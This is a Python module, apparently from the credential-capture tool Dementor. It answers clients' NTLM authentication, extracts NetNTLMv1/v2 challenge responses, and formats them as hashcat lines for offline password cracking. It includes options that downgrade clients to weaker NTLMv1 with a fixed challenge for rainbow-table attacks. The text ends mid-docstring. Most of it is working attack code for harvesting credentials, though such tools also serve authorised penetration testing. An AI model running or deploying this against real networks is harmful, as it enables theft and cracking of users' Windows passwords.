# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: reportAny=false, reportExplicitAny=false, reportUnknownVariableType=false
# pyright: reportUnknownArgumentType=false
"""NTLM authentication helper module for Dementor.

Implements the server-side CHALLENGE_MESSAGE construction and
AUTHENTICATE_MESSAGE hash extraction logic per [MS-NLMP].

Dementor is a capture server -- it does not verify client responses, compute
session keys, or participate in post-authentication signing/sealing.  It only
needs to:

    1. Build a valid CHALLENGE_MESSAGE that keeps the handshake alive.
    2. Extract crackable hashes from the AUTHENTICATE_MESSAGE.
    3. Format those hashes for offline cracking with hashcat.

The three-message NTLM handshake (per [MS-NLMP] section 1.3.1.1):

    Client                                  Server (Dementor)
      |                                         |
      |--- NEGOTIATE_MESSAGE -----------------> |
      |                                         |  <- inspect client flags
      |<-- CHALLENGE_MESSAGE ------------------ |  <- Dementor controls entirely
      |                                         |
      |--- AUTHENTICATE_MESSAGE --------------> |  <- capture & extract hashes
      |                                         |

Variable names follow [MS-NLMP] specification terminology (terminology reference):

    ServerChallenge     8-byte nonce in the CHALLENGE_MESSAGE
    NegotiateFlags      32-bit flag field in any NTLM message
    LmChallengeResponse LM response field from the AUTHENTICATE_MESSAGE
    NtChallengeResponse NT response field from the AUTHENTICATE_MESSAGE
    NTProofStr          First 16 bytes of an NTLMv2 NtChallengeResponse
    Blob                NTLMv2_CLIENT_CHALLENGE -- remainder after NTProofStr
    ClientChallenge     8-byte client nonce (ESS or NetLMv2)
    UserName            Authenticated user identity from AUTHENTICATE_MESSAGE
    DomainName          Authenticated domain identity from AUTHENTICATE_MESSAGE

Hashcat output formats (validated against module_05500.c and module_05600.c):

    Mode 5500 (NetNTLMv1/NetNTLMv1-ESS):  User::Domain:LmResponse:NtResponse:ServerChallenge
    Mode 5600 (NetNTLMv2/NetLMv2):        User::Domain:ServerChallenge:NTProofStr:Blob
"""

import time
import calendar
import secrets
from typing import Any

from caterpillar.py import LittleEndian, uint16
from impacket import ntlm
from impacket.smb3 import WIN_VERSIONS

from dementor.config.toml import Attribute
from dementor.config.session import SessionConfig
from dementor.config.util import is_true, get_value, BytesValue
from dementor.db import _HOST_INFO
from dementor.log.logger import ProtocolLogger, dm_logger

# ===========================================================================
# Constants
# ===========================================================================

# NTLMv1 NtChallengeResponse and LmChallengeResponse are always exactly
# 24 bytes (DESL output per §6).  NTLMv2 NtChallengeResponse is always
# > 24 bytes (NTProofStr(16) + variable Blob per §2.2.2.8).
# Sole discriminator between v1 and v2; the ESS flag does NOT imply v2.
NTLMV1_RESPONSE_LEN: int = 24

# ServerChallenge nonce length (§2.2.1.2).
NTLM_CHALLENGE_LEN: int = 8

# NTProofStr length in an NTLMv2 NtChallengeResponse (§3.3.2).
NTLM_NTPROOFSTR_LEN: int = 16

# TargetName payload offset in CHALLENGE_MESSAGE: fixed header is 56 bytes (§2.2.1.2).
NTLM_CHALLENGE_MSG_DOMAIN_OFFSET: int = 56

# 16 zero bytes used as the ESS padding suffix in LmChallengeResponse and
# as the null-hash seed for dummy LM response detection.
NTLM_ESS_ZERO_PAD: bytes = b"\x00" * 16

# Placeholder VERSION structure emitted in CHALLENGE_MESSAGE.
NTLM_VERSION_PLACEHOLDER: bytes = b"\x00" * 8

# VERSION structure per [MS-NLMP section 2.2.2.10]
NTLM_VERSION_LEN: int = 8

# Offset from the Unix epoch (1 Jan 1970) to the Windows FILETIME epoch
# (1 Jan 1601), expressed in 100-nanosecond intervals.
NTLM_FILETIME_EPOCH_OFFSET: int = 116_444_736_000_000_000

# Multiplier converting whole seconds to 100-nanosecond FILETIME ticks.
NTLM_FILETIME_TICKS_PER_SECOND: int = 10_000_000

# ===========================================================================
# Transport
# ===========================================================================
# Transport affects only how credentials are extracted; it does not change
# the hash format or the crackable material.
#
#   NTLM_TRANSPORT_RAW      Pre-NTLMSSP SMB1 -- LM/NT at fixed packet offsets.
#   NTLM_TRANSPORT_NTLMSSP  NTLMSSP AUTHENTICATE_MESSAGE (SPNEGO/GSSAPI, SMB2+).
#
NTLM_TRANSPORT_RAW: str = "raw"
NTLM_TRANSPORT_NTLMSSP: str = "ntlmssp"

# ===========================================================================
# Hash Types  (MS-NLMP §3.3)
# ===========================================================================
# Classification is based on NT response length and LM response content.
#
#  Type        NT len   LM len / content     HC mode  MS-NLMP ref
#  ─────────── ──────── ─────────────────── ──────── ─────────────────────
#  NetNTLMv1      24       any / non-dummy      5500     §3.3.1 plain DES
#  NetNTLMv1-ESS  24       24 / LM[8:]==Z(16)   5500*    §3.3.1 + ESS
#  NetNTLMv2      > 24     n/a                  5600     §3.3.2 HMAC-MD5 blob
#  NetLMv2        > 24†    24 / non-null        5600†    §3.3.2 LMv2 companion
#
#  * Mode 5500 auto-detects ESS via LM[8:24]==Z(16); always emit raw ServerChallenge.
#  † NetLMv2 is always paired with NetNTLMv2; both use -m 5600.
#
# Hashcat formats (module_05500.c and module_05600.c):
#   NetNTLMv1      user::domain:LM(48 hex):NT(48 hex):ServerChallenge(16 hex)
#   NetNTLMv1-ESS  user::domain:CChal(16 hex)+Z(32 hex):NT(48 hex):ServerChallenge(16 hex)
#   NetNTLMv2      user::domain:ServerChallenge(16 hex):NTProofStr(32 hex):Blob(var hex)
#   NetLMv2        user::domain:ServerChallenge(16 hex):LMProof(32 hex):CChal(16 hex)
#
# ESS detection (§3.3.1): LmChallengeResponse = ClientChallenge(8) || Z(16).
#   len==24 and LM[8:]==Z(16) is the sole reliable signal; the ESS negotiate
#   flag is supplementary only. For NTLM_TRANSPORT_RAW there are no flags,
#   so only the byte structure is checked.
#
# =============================================================================
# Responder → Dementor label mapping
# =============================================================================
#
#  Responder label   Dementor label      Reason
#  ─────────────── ─────────────────── ────────────────────────────────────────
#  NTLMv1-SSP       NetNTLMv1 or        Responder collapses both; ESS changes the
#                   NetNTLMv1-ESS        effective challenge and must be distinct.
#  NTLMv2-SSP       NetNTLMv2           Responder threshold: len > 60; spec minimum
#                                       is 48 bytes. Dementor uses > 24.
#
NTLM_V1: str = "NetNTLMv1"
NTLM_V1_ESS: str = "NetNTLMv1-ESS"
NTLM_V2: str = "NetNTLMv2"
NTLM_V2_LM: str = "NetLMv2"  # Always paired with NetNTLMv2; both use hashcat -m 5600.


def NTLM_AUTH_classify(
    nt_response: bytes, lm_response: bytes, negotiate_flags: int
) -> str:
    """Classify the hash type from an AUTHENTICATE_MESSAGE response.

    :param bytes nt_response: The NtChallengeResponse field
    :param bytes lm_response: The LmChallengeResponse field
    :param int negotiate_flags: The NegotiateFlags from the message
    :return: Classification label (NTLM_V1, NTLM_V1_ESS, NTLM_V2, or NTLM_V2_LM)
    :rtype: str
    """
    # Fallback to NetNTLMv1 on TypeError (None or non-bytes input) rather than raising.
    try:
        nt_len = len(nt_response)
    except TypeError:
        dm_logger.debug(
            "NTLM_AUTH_classify: nt_response is not bytes-like (%s), defaulting to %s",
            type(nt_response).__name__,
            NTLM_V1,
        )
        return NTLM_V1

    if nt_len > NTLMV1_RESPONSE_LEN:
        return NTLM_V2

    # ESS: per §3.3.1 ComputeResponse, LmChallengeResponse = ClientChallenge(8) || Z(16).
    # This mandates exactly 24 bytes; the byte structure is the sole reliable signal.
    # The NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY flag is cross-checked only.
    try:
        ess_by_lm = (
            len(lm_response) == NTLMV1_RESPONSE_LEN
            and lm_response[NTLM_CHALLENGE_LEN:] == NTLM_ESS_ZERO_PAD
        )
    except TypeError:
        dm_logger.debug(
            "NTLM_AUTH_classify: lm_response is not bytes-like (%s), defaulting to %s",
            type(lm_response).__name__,
            NTLM_V1,
        )
        return NTLM_V1

    try:
        ess_by_flag = bool(
            negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        )
    except TypeError:
        ess_by_flag = False

    if ess_by_flag and not ess_by_lm:
        dm_logger.debug("ESS flag set but LM[8:24] != Z(16); classifying as %s", NTLM_V1)
    elif ess_by_lm and not ess_by_flag:
        dm_logger.debug(
            "LM[8:24] == Z(16) but ESS flag not set; classifying as %s",
            NTLM_V1_ESS,
        )

    return NTLM_V1_ESS if ess_by_lm else NTLM_V1


# Challenge parsing is handled by BytesValue(NTLM_CHALLENGE_LEN) from
# dementor.config.util — supports hex:/ascii: prefixes, auto-detect,
# and length validation in a single reusable helper.
_parse_challenge = BytesValue(NTLM_CHALLENGE_LEN)


# ===========================================================================
# Configuration Attributes
#
# Attribute objects define the TOML config file entries and their mapping
# to SessionConfig fields.  Each Attribute specifies:
#   - The SessionConfig field name
#   - The TOML section.key path
#   - A default value
#   - Whether it is global or per-listener
#   - A factory function for type conversion
# ===========================================================================

ATTR_NTLM_CHALLENGE = Attribute(
    "ntlm_challenge",
    "NTLM.Challenge",
    default_val=None,  # None -> random 8-byte ServerChallenge at startup
    section_local=False,
    factory=_parse_challenge,  # BytesValue: hex:/ascii: prefix + auto-detect + length validation
)

ATTR_NTLM_DISABLE_ESS = Attribute(
    "ntlm_disable_ess",
    "NTLM.DisableExtendedSessionSecurity",
    False,  # Default: ESS enabled -> NetNTLMv1-ESS hashes
    section_local=False,
    factory=is_true,
)

ATTR_NTLM_DISABLE_NTLMV2 = Attribute(
    "ntlm_disable_ntlmv2",
    "NTLM.DisableNTLMv2",
    False,  # Default: NTLMv2 enabled (TargetInfoFields present)
    section_local=False,
    factory=is_true,
)


# ===========================================================================
# Configuration
# ===========================================================================


def apply_config(session: SessionConfig) -> None:
    """Apply global NTLM settings from [NTLM] to the session.

    Reads [NTLM] section values and populates session-level NTLM attributes.
    Individual protocol server configs inherit these as defaults via ATTR_NTLM_*
    and can override any of the three options in their own config section.

    On any parsing error, safe defaults are kept so startup continues.

    :param SessionConfig session: Session object whose NTLM attributes will be populated
    """
    # Safe defaults (session remains valid even if config parsing fails).
    session.ntlm_challenge = secrets.token_bytes(NTLM_CHALLENGE_LEN)
    session.ntlm_disable_ess = False
    session.ntlm_disable_ntlmv2 = False

    # -- ServerChallenge ---------------------------------------------------
    try:
        raw_challenge = get_value("NTLM", "Challenge", default=None)
        session.ntlm_challenge = _parse_challenge(raw_challenge)
    except Exception:
        dm_logger.exception("Failed to parse NTLM Challenge; using random bytes")
    dm_logger.debug(
        "NTLM Challenge set to value: %s with len %d",
        session.ntlm_challenge.hex(),
        len(session.ntlm_challenge),
    )

    # -- Extended Session Security -----------------------------------------
    try:
        raw = get_value("NTLM", "DisableExtendedSessionSecurity", default=False)
        session.ntlm_disable_ess = bool(is_true(raw))
    except Exception:
        session.ntlm_disable_ess = False
        dm_logger.exception(
            "Failed to apply NTLM.DisableExtendedSessionSecurity; defaulting to False"
        )
    else:
        dm_logger.debug(
            "NTLM DisableExtendedSessionSecurity: %s", session.ntlm_disable_ess
        )

    # -- Disable NTLMv2 ----------------------------------------------------
    try:
        raw = get_value("NTLM", "DisableNTLMv2", default=False)
        session.ntlm_disable_ntlmv2 = bool(is_true(raw))
    except Exception:
        session.ntlm_disable_ntlmv2 = False
        dm_logger.exception("Failed to apply NTLM.DisableNTLMv2; defaulting to False")
    else:
        dm_logger.debug("NTLM DisableNTLMv2: %s", session.ntlm_disable_ntlmv2)

    if session.ntlm_disable_ntlmv2:
        dm_logger.warning(
            "NTLM DisableNTLMv2 is enabled — Level 3+ clients (all modern Windows) "
            + "will FAIL authentication and NO hashes will be captured. "
            + "This only helps against pre-Vista / manually-configured Level 0-2 clients. "
            + "Use with caution."
        )


# ===========================================================================
# Wire Encoding Helpers  [MS-NLMP §2.2 and §2.2.2.5]
#
# NEGOTIATE_MESSAGE fields: always OEM (Unicode not yet negotiated).
# CHALLENGE_MESSAGE / AUTHENTICATE_MESSAGE: governed by NegotiateFlags:
#   NTLMSSP_NEGOTIATE_UNICODE (0x01) → UTF-16LE (no BOM)
#   NTLM_NEGOTIATE_OEM        (0x02) → cp437 baseline
# ===========================================================================


def NTLM_AUTH_decode_string(
    data: bytes | None,
    negotiate_flags: int,
    is_negotiate_oem: bool = False,
) -> str:
    """Decode an NTLM wire string into a Python str.

    :param bytes|None data: Raw bytes from the NTLM message field
    :param int negotiate_flags: NegotiateFlags from the message. Determines encoding for
        CHALLENGE_MESSAGE and AUTHENTICATE_MESSAGE fields
    :param bool is_negotiate_oem: If True, forces OEM/ASCII decoding regardless of flags.
        Set this when decoding fields from a NEGOTIATE_MESSAGE, where Unicode
        negotiation has not yet occurred per [MS-NLMP section 2.2]
    :return: Decoded string. Returns "" for None or empty input.
        Malformed bytes are replaced with U+FFFD rather than raising
    :rtype: str
    """
    if not data:
        return ""

    # NEGOTIATE_MESSAGE fields: always OEM -- Unicode has not been negotiated yet
    if is_negotiate_oem:
        return data.decode("ascii", errors="replace")

    # CHALLENGE_MESSAGE / AUTHENTICATE_MESSAGE fields: encoding governed by flags
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return data.decode("utf-16le", errors="replace")

    # OEM fallback -- cp437 as baseline; actual code page is system-dependent
    return data.decode("cp437", errors="replace")


def NTLM_AUTH_encode_string(string: str | None, negotiate_flags: int) -> bytes:
    """Encode a Python str for inclusion in a CHALLENGE_MESSAGE.

    :param str|None string: The string to encode (server name, domain, etc.)
    :param int negotiate_flags: NegotiateFlags that determine encoding
    :return: UTF-16LE if Unicode is negotiated, cp437 (OEM) otherwise.
        Returns b"" for None or empty input
    :rtype: bytes
    """
    if not string:
        return b""
    if negotiate_flags & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
        return string.encode("utf-16le")  # No BOM per [MS-NLMP section 2.2]
    return string.encode("cp437", errors="replace")


# ===========================================================================
# Dummy LM Response Filtering  [MS-NLMP §3.3.1]
#
# When no LM hash is available (password > 14 chars or NoLMHash policy),
# the client fills LmChallengeResponse with DESL() of a known dummy input:
#   1. Z(16) -- 16 null bytes
#   2. DEFAULT_LM_HASH (AAD3B435B51404EE) -- LMOWFv1("")
# These values are deterministic and carry no crackable material.
# ===========================================================================


def _compute_dummy_lm_responses(server_challenge: bytes) -> set[bytes]:
    """Compute the two known dummy LmChallengeResponse values (per §3.3.1).

    :param bytes server_challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE
    :return: Two 24-byte DESL() outputs for the null and empty-string LM hashes.
        Any LmChallengeResponse matching either contains no crackable material
    :rtype: set of bytes
    """
    return {
        ntlm.ntlmssp_DES_encrypt(NTLM_ESS_ZERO_PAD, server_challenge),
        ntlm.ntlmssp_DES_encrypt(ntlm.DEFAULT_LM_HASH, server_challenge),
    }


# ===========================================================================
# NEGOTIATE_MESSAGE Parsing
# ===========================================================================


def NTLM_AUTH_format_host(token: ntlm.NTLMAuthChallengeResponse) -> str:
    """Extract a human-readable host description from a CHALLENGE_MESSAGE.

    :param ntlm.NTLMAuthChallengeResponse token: Parsed CHALLENGE_MESSAGE from the client
    :return: "OS [ (name: HOSTNAME) ] [ (domain: DOMAIN) ]" Never raises
    :rtype: str
    """
    flags: int = 0
    hostname: str = ""
    domain_name: str = ""
    os_version: str = "0.0.0"

    try:
        flags = token["flags"]
        hostname = (
            NTLM_AUTH_decode_string(
                token["host_name"],
                flags,
                is_negotiate_oem=True,
            )
            or ""
        )
        domain_name = (
            NTLM_AUTH_decode_string(
                token["domain_name"],
                flags,
                is_negotiate_oem=True,
            )
            or ""
        )
    except Exception:
        dm_logger.debug(
            "Failed to parse hostname/domain from NEGOTIATE_MESSAGE",
            exc_info=True,
        )

    # Parse the OS VERSION structure separately so a version parse failure
    # does not discard the already-decoded hostname and domain.
    try:
        ver_raw: bytes = token["Version"]
        major: int = ver_raw[0]
        minor: int = ver_raw[1]
        build: int = uint16.from_bytes(ver_raw[2:4], order=LittleEndian)

        os_version = f"{major}.{minor}"
        if build in WIN_VERSIONS:
            os_version = f"{WIN_VERSIONS[build]}"

        if build:
            os_version = f"{os_version} Build {build}"

        if (major, minor, build) == (6, 1, 0):
            os_version = "Unix - Samba"

    except Exception:
        dm_logger.debug(
            "Failed to parse OS version from NEGOTIATE_MESSAGE; using 0.0.0",
            exc_info=True,
        )

    host_info = os_version
    if hostname:
        host_info += f" (name: {hostname})"

    if domain_name:
        host_info += f" (domain: {domain_name})"

    return host_info


# ===========================================================================
# Hashcat Format Extraction
#
# Output formats validated against hashcat module source code
# (module_05500.c and module_05600.c):
#
# hashcat -m 5500 (NetNTLMv1 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length -- the "::" separator
#   [2] DomainName           plain text, 0-45 chars
#   [3] LmChallengeResponse  hex, 0-48 chars (0=absent, 48=present)
#   [4] NtChallengeResponse  hex, FIXED 48 chars
#   [5] ServerChallenge      hex, FIXED 16 chars
#
#   ESS auto-detection: if [3] is 48 hex AND bytes 8-23 are zero,
#   hashcat computes MD5(ServerChallenge || ClientChallenge)[0:8]
#   internally.
#   Do NOT pre-compute FinalChallenge; always emit raw ServerChallenge.
#
#   Identity: UserName is null-expanded to UTF-16LE as-is (no toupper).
#
# hashcat -m 5600 (NetNTLMv2 family) -- 6 colon-delimited tokens:
#   [0] UserName             plain text, 0-60 chars
#   [1] (empty)              fixed 0 length
#   [2] DomainName           plain text, 0-45 chars (case-sensitive)
#   [3] ServerChallenge      hex, FIXED 16 chars
#   [4] NTProofStr           hex, FIXED 32 chars
#   [5] Blob                 hex, 2-1024 chars
#
#   Identity: hashcat applies C toupper() to UserName bytes, then
#   null-expands to UTF-16LE.  DomainName used as-is.
#   User/Domain MUST be decoded plain-text strings, NOT raw hex bytes.
# ===========================================================================


def NTLM_AUTH_to_hashcat_formats(
    server_challenge: bytes,
    user_name: bytes | str,
    domain_name: bytes | str,
    lm_response: bytes | None,
    nt_response: bytes | None,
    negotiate_flags: int,
) -> list[tuple[str, str]]:
    """Extract all crackable hashcat lines from an AUTHENTICATE_MESSAGE.

    Returns up to two entries: the primary hash and, for NetNTLMv2, the LMv2
    companion. Callers must check for anonymous auth before invoking.

    :param bytes server_challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent
    :param bytes|str user_name: UserName from the AUTHENTICATE_MESSAGE
    :param bytes|str domain_name: DomainName from the AUTHENTICATE_MESSAGE
    :param bytes|None lm_response: LmChallengeResponse from the AUTHENTICATE_MESSAGE
    :param bytes|None nt_response: NtChallengeResponse from the AUTHENTICATE_MESSAGE
    :param int negotiate_flags: NegotiateFlags from the NTLM exchange
    :return: (label, hashcat_line) tuples. Labels: NTLM_V2 ("NetNTLMv2"),
        NTLM_V2_LM ("LMv2"), NTLM_V1_ESS ("NetNTLMv1-ESS"), NTLM_V1 ("NetNTLMv1")
    :rtype: list of (str, str)
    :raises ValueError: If server_challenge is not exactly NTLM_CHALLENGE_LEN bytes

    .. note::

        - Hash type determined by NTLM_AUTH_classify() called once; no raw length
          comparisons appear in the branches below.
        - Dummy LM responses (DESL of null or empty-string LM hash) are discarded.
        - Level 2 duplication (LM == NT) omits the LM slot.
        - Per §3.3.2 rule 7: when MsvAvTimestamp is present, clients set
          LmChallengeResponse to Z(24); this null LMv2 is detected and skipped.
    """
    if len(server_challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"server_challenge must be {NTLM_CHALLENGE_LEN} bytes, "
            + f"got {len(server_challenge)}"
        )

    captures: list[tuple[str, str]] = []

    # -- Normalise None inputs to empty bytes --------------------------------
    lm_response = lm_response or b""
    nt_response = nt_response or b""

    # No NtChallengeResponse -> nothing to crack
    if not nt_response:
        dm_logger.debug("NtChallengeResponse is empty; skipping hash extraction")
        return captures

    # -- Decode identity strings ---------------------------------------------
    # Both hashcat modes require decoded plain-text strings, not raw wire
    # bytes.  Hashcat does its own toupper + UTF-16LE expansion internally.
    try:
        user: str = (
            NTLM_AUTH_decode_string(bytes(user_name), negotiate_flags)
            if isinstance(user_name, (bytes, bytearray, memoryview))
            else (user_name or "")
        )
    except Exception:
        dm_logger.debug("Failed to decode UserName; using empty string", exc_info=True)
        user = ""

    try:
        domain: str = (
            NTLM_AUTH_decode_string(bytes(domain_name), negotiate_flags)
            if isinstance(domain_name, (bytes, bytearray, memoryview))
            else (domain_name or "")
        )
    except Exception:
        dm_logger.debug("Failed to decode DomainName; using empty string", exc_info=True)
        domain = ""

    try:
        hash_type: str = NTLM_AUTH_classify(nt_response, lm_response, negotiate_flags)
    except Exception:
        dm_logger.debug(
            "NTLM_AUTH_classify raised unexpectedly; defaulting to %s",
            NTLM_V1,
            exc_info=True,
        )
        hash_type = NTLM_V1

    dm_logger.debug(
        "Extracting hashes: user=%r domain=%r hash_type=%s nt_len=%d lm_len=%d",
        user,
        domain,
        hash_type,
        len(nt_response),
        len(lm_response),
    )

    server_challenge_hex: str = server_challenge.hex()

    # NetNTLMv2: NtChallengeResponse = NTProofStr(16) + Blob(var) per §2.2.2.8
    # hashcat -m 5600: User::Domain:ServerChallenge:NTProofStr:Blob
    if hash_type == NTLM_V2:
        try:
            nt_proof_str_hex: str = nt_response[:NTLM_NTPROOFSTR_LEN].hex()
            blob_hex: str = nt_response[NTLM_NTPROOFSTR_LEN:].hex()
            captures.append(
                (
                    NTLM_V2,
                    f"{user}::{domain}"
                    + f":{server_challenge_hex}"
                    + f":{nt_proof_str_hex}"
                    + f":{blob_hex}",
                )
            )
            dm_logger.debug("Appended %s hash (nt_len=%d)", NTLM_V2, len(nt_response))
        except Exception:
            dm_logger.debug("Failed to format %s hash; skipping", NTLM_V2, exc_info=True)
            return captures

        # NetLMv2 companion: HMAC-MD5(ResponseKeyLM, Server||Client)[0:16] || CChal(8)
        # Per §3.3.2 rule 7: if MsvAvTimestamp was in the challenge, clients send Z(24).
        # hashcat -m 5600: User::Domain:ServerChallenge:LMProof:ClientChallenge
        try:
            if len(lm_response) == NTLMV1_RESPONSE_LEN:
                if lm_response == b"\x00" * NTLMV1_RESPONSE_LEN:
                    dm_logger.debug(
                        "LmChallengeResponse is Z(%d) "
                        + "(MsvAvTimestamp suppression or null LM); skipping %s",
                        NTLMV1_RESPONSE_LEN,
                        NTLM_V2_LM,
                    )
                else:
                    lm_proof_hex: str = lm_response[:NTLM_NTPROOFSTR_LEN].hex()
                    lm_cc_hex: str = lm_response[
                        NTLM_NTPROOFSTR_LEN:NTLMV1_RESPONSE_LEN
                    ].hex()
                    captures.append(
                        (
                            NTLM_V2_LM,
                            f"{user}::{domain}"
                            + f":{server_challenge_hex}"
                            + f":{lm_proof_hex}"
                            + f":{lm_cc_hex}",
                        )
                    )
                    dm_logger.debug("Appended %s companion hash", NTLM_V2_LM)
            else:
                dm_logger.debug(
                    "LmChallengeResponse length %d unexpected for %s; skipping",
                    len(lm_response),
                    NTLM_V2_LM,
                )
        except Exception:
            dm_logger.debug(
                "Failed to format %s hash; skipping", NTLM_V2_LM, exc_info=True
            )

        return captures

    # NetNTLMv1-ESS: per §3.3.1, ESS uses MD5(Server||Client)[0:8] as the challenge.
    # Hashcat -m 5500 derives the mixed challenge internally; emit raw ServerChallenge.
    # LM field: ClientChallenge(8) || Z(16) = 24 bytes.
    if hash_type == NTLM_V1_ESS:
        try:
            nt_response_hex: str = nt_response.hex()
            lm_ess_hex: str = (
                lm_response[:NTLM_CHALLENGE_LEN].hex() + NTLM_ESS_ZERO_PAD.hex()
            )
            captures.append(
                (
                    NTLM_V1_ESS,
                    f"{user}::{domain}"
                    + f":{lm_ess_hex}"
                    + f":{nt_response_hex}"
                    + f":{server_challenge_hex}",
                )
            )
            dm_logger.debug("Appended %s hash", NTLM_V1_ESS)
        except Exception:
            dm_logger.debug(
                "Failed to format %s hash; skipping", NTLM_V1_ESS, exc_info=True
            )
        return captures

    # NetNTLMv1: hashcat -m 5500: User::Domain:LM:NT:ServerChallenge
    # LM slot is optional (0 or 48 hex chars); including a real LM response
    # enables the DES third-key optimisation. Two cases skip the LM slot:
    #   1. Level 2 duplication: client copies NT into LM (wrong one-way function).
    #   2. Dummy LM: DESL() with null/empty-string hash — no crackable material.
    try:
        nt_response_hex = nt_response.hex()
        lm_slot_hex: str = ""

        if len(lm_response) == NTLMV1_RESPONSE_LEN:
            if lm_response == nt_response:
                # Case 1: duplication — LM is a copy of NT, skip it
                dm_logger.debug(
                    "LmChallengeResponse == NtChallengeResponse "
                    + "(Level 2 duplication); omitting LM slot"
                )
            elif lm_response in _compute_dummy_lm_responses(server_challenge):
                # Case 2: dummy DESL output — no crackable credential material
                dm_logger.debug(
                    "LmChallengeResponse matches dummy LM hash; omitting LM slot"
                )
            else:
                # Real LmChallengeResponse: include for DES third-key optimisation
                lm_slot_hex = lm_response.hex()
                dm_logger.debug("Including real LmChallengeResponse in %s hash", NTLM_V1)

        captures.append(
            (
                NTLM_V1,
                f"{user}::{domain}"
                + f":{lm_slot_hex}"
                + f":{nt_response_hex}"
                + f":{server_challenge_hex}",
            )
        )
        dm_logger.debug("Appended %s hash (lm_slot_empty=%s)", NTLM_V1, lm_slot_hex == "")
    except Exception:
        dm_logger.debug("Failed to format %s hash; skipping", NTLM_V1, exc_info=True)

    return captures


# ===========================================================================
# Timestamp and FQDN Helpers
# ===========================================================================


def NTLM_new_timestamp() -> int:
    """Return the current UTC time as a Windows FILETIME (100ns ticks since 1601-01-01).

    :return: Current UTC time in 100-nanosecond intervals since Windows epoch (1601-01-01)
    :rtype: int
    """
    # calendar.timegm() → UTC seconds since 1970; scaled to 100ns ticks since 1601.
    return (
        NTLM_FILETIME_EPOCH_OFFSET
        + calendar.timegm(time.gmtime()) * NTLM_FILETIME_TICKS_PER_SECOND
    )


def NTLM_split_fqdn(fqdn: str) -> tuple[str, str]:
    """Split a fully-qualified domain name into (hostname, domain).

    :param str fqdn: Fully-qualified domain name, e.g. "SERVER1.corp.example.com"
    :return: ("SERVER1", "corp.example.com") if dotted, or
        (fqdn, "WORKGROUP") if no dots present, or
        ("WORKGROUP", "WORKGROUP") if empty
    :rtype: tuple of (str, str)
    """
    if not fqdn:
        return ("WORKGROUP", "WORKGROUP")
    if "." in fqdn:
        hostname, domain = fqdn.split(".", 1)
        return (hostname, domain)
    return (fqdn, "WORKGROUP")


# ===========================================================================
# Anonymous Authentication Detection  [MS-NLMP section 3.2.5.1.2]
# ===========================================================================


def NTLM_AUTH_is_anonymous(token: ntlm.NTLMAuthChallengeResponse) -> bool:
    """Return True if the AUTHENTICATE_MESSAGE is an anonymous (null session) auth.

    Per §3.2.5.1.2 server-side logic, null session is structural:
    UserName empty, NtChallengeResponse empty, and LmChallengeResponse
    empty or Z(1). For capture-first operation, do not trust the anonymous
    flag alone, and do not fail-closed on parsing exceptions.

    :param ntlm.NTLMAuthChallengeResponse token: Parsed AUTHENTICATE_MESSAGE from the client
    :return: True if the message is structurally anonymous
    :rtype: bool
    """
    try:
        # Structural anonymous: all response fields empty or Z(1)
        flags: int = token["flags"]
        user_name: bytes = token["user_name"] or b""
        nt_response: bytes = token["ntlm"] or b""
        lm_response: bytes = token["lanman"] or b""

        is_anon = (
            len(user_name) == 0
            and len(nt_response) == 0
            and (len(lm_response) == 0 or lm_response == b"\x00")
        )
        if is_anon:
            dm_logger.debug("Structurally anonymous AUTHENTICATE_MESSAGE detected")
            return True

        return is_anon or bool(flags & ntlm.NTLMSSP_NEGOTIATE_ANONYMOUS)

    except Exception:
        dm_logger.debug(
            "Failed to check anonymous status in AUTHENTICATE_MESSAGE; "
            + "treating as non-anonymous to avoid dropping captures",
            exc_info=True,
        )
        return False


# ===========================================================================
# CHALLENGE_MESSAGE Construction  [MS-NLMP section 2.2.1.2]
#
# Dementor controls this message entirely.  The two boolean parameters
# (disable_ess, disable_ntlmv2) steer which authentication protocol the
# client uses in its AUTHENTICATE_MESSAGE:
#
#   - disable_ntlmv2=True  -> omit TargetInfoFields -> client cannot build
#     the NTLMv2 Blob -> level 0-2 clients fall back to NTLMv1, level 3+
#     clients FAIL authentication
#   - disable_ess=True     -> strip ESS flag -> pure NTLMv1 (vulnerable to
#     rainbow tables with a fixed ServerChallenge)
# ===========================================================================


def NTLM_AUTH_CreateChallenge(
    token: ntlm.NTLMAuthNegotiate | dict[str, Any],
    name: str,
    domain: str,
    challenge: bytes,
    disable_ess: bool = False,
    disable_ntlmv2: bool = False,
) -> ntlm.NTLMAuthChallenge:
    """Build a CHALLENGE_MESSAGE from the client's NEGOTIATE_MESSAGE flags.

    :param ntlm.NTLMAuthNegotiate|dict token: Parsed NEGOTIATE_MESSAGE (must have a "flags" key)
    :param str name: Server NetBIOS computer name — the flat hostname label, e.g.
        "DEMENTOR" or "SERVER1". Must not contain a dot; callers should
        obtain this from NTLM_split_fqdn
    :param str domain: Server DNS domain name or "WORKGROUP", e.g. "corp.example.com".
        A domain-joined machine supplies its full DNS domain; a standalone
        machine supplies "WORKGROUP". Callers should obtain this from
        NTLM_split_fqdn
    :param bytes challenge: 8-byte ServerChallenge nonce
